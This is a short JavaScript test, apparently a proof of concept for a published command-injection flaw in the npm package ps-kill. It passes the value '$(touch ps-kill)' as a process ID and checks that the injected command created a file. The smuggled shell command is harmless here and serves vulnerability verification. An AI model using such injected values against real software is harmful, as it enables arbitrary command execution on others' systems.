//https://snyk.io/vuln/SNYK-JS-PSKILL-1078529
test("Command Injection in ps-kill", () => {
  const ps_kill = require("ps-kill");
  const fs = require("fs");
  const path = "./ps-kill";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  ps_kill.kill("$(touch ps-kill)", function () {});

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});
